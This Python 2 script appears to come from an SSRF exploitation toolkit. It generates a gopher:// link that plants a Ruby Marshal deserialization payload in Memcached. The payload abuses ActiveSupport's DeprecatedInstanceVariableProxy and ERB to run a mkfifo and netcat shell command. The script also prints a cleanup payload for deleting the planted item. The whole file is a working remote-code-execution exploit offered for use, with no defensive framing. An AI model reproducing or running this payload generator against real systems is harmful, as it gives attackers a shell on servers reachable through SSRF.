import urllib

def RbMemcached():
    print "\033[01m" +"\nReady to Get Reverse SHELL\n"+ "\033[0m"
    server = raw_input("\033[96m" +"Give server IP you want to connect (default is 127.0.0.1): "+ "\033[0m")

    if(not server):
        server = "127.0.0.1"

    cmd = "rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l " + server + " 1234 > /tmp/f"


    payload = """\x04\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0e@instanceo:\x08ERB\x06:\t@srcI\"""" + chr(len(cmd)+10)
    payload += "%x(" + cmd + """);\x06:\x06ET:\x0c@method:\x0bresult:\t@varI"\x0c@result\x06;\tT:\x10@deprecatoro:\x1fActiveSupport::Deprecation\x06:\x0e@silencedT"""

    def get_payload(payload):
        payload_len = len(payload)
        payload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
        finalpayload = "%0d%0aset%20SpyD3r%204%2060%20" + str(payload_len) + "%0d%0a" + payload + "%0d%0a"
        return finalpayload

    print "\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m"
    print "\033[04m" +"gopher://127.0.0.1:11211/_" + get_payload(payload)+ "\033[0m"

    print "\033[01m" +"\nThen You can connect it with : nc " + server + " 1234"+ "\033[0m"

    print "\033[93m" +"\nAfter everything done, you can delete memcached item by using this payload: \n"+ "\033[0m"
    print "\033[04m" + "gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a"+ "\033[0m"
    print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
